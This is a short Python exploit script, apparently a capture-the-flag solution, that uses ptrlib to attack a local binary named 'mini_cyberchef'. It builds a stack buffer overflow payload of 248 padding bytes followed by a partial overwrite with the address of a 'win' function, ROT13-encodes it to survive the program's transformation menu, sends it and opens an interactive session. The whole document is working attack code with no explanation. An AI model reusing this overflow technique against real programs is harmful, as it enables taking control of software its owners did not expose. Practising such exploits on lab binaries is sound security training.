from ptrlib import *
import codecs

elf = ELF('./mini_cyberchef')
io = process('./mini_cyberchef')

offset = 248

payload = b'a' * offset
payload += p16(elf.symbol('win'))

payload = codecs.encode(payload.decode(), 'rot_13')

io.sendlineafter('> ', '3')
io.sendlineafter('> ', payload)

io.recvuntil("\nRestore\n")[:-10]

io.interactive()

